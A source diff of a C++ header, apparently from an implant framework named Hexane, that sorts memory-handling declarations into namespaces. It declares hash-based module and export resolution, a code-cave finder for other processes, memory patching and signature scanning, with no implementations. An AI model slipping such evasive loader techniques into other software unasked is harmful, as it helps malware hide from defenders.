@@ -3,13 +3,31 @@
 #include <core/corelib.hpp>
 
 namespace Memory {
-    FUNCTION VOID       ResolveApi();
-    FUNCTION VOID       ContextInit();
-    FUNCTION VOID       ContextDelete(HEXANE_CTX *Ctx);
-    FUNCTION HMODULE    LdrGetModuleAddress(ULONG hash);
-    FUNCTION FARPROC    LdrGetSymbolAddress(HMODULE base, ULONG hash);
-    FUNCTION PRSRC      LdrGetIntResource(HMODULE Base, INT RsrcId);
-    FUNCTION UINT_PTR   LdrGetExport(LPSTR Module, LPSTR Export);
-    FUNCTION UINT_PTR   MmCaveHunter(HANDLE Proc, LPVOID Export, SIZE_T Size);
+
+    FUNCTION VOID PatchMemory(byte *dst, byte const *src, int d_offs, int s_offs, size_t n);
+    FUNCTION VOID GetProcessHeaps(void *process, uint32_t access, uint32_t pid);
+    FUNCTION PRSRC GetIntResource(HMODULE base, int RsrcId);
+
+    namespace Context {
+
+        FUNCTION VOID ResolveApi();
+        FUNCTION VOID ContextInit();
+        FUNCTION VOID ContextDestroy(HEXANE_CTX *Ctx);
+    }
+
+    namespace Modules {
+
+        FUNCTION LDR_DATA_TABLE_ENTRY* GetModuleEntry(uint32_t hash);
+        FUNCTION HMODULE GetModuleAddress(PLDR_DATA_TABLE_ENTRY entry);
+        FUNCTION FARPROC GetSymbolAddress(HMODULE Base, ULONG Hash);
+        FUNCTION UINT_PTR GetExportAddress(char *module_name, char *export_name);
+    }
+
+    namespace Scanners {
+
+        FUNCTION UINT_PTR RelocateExport(void *process, void *target, size_t size);
+        FUNCTION BOOL SignatureMatch(const uint8_t *data, const char *signature, const char *mask);
+        FUNCTION UINT_PTR SignatureScan(uintptr_t start, uint32_t size, const char *signature, const char *mask);
+    }
 }
 #endif //HEXANE_CORELIB_MEMORY_HPP
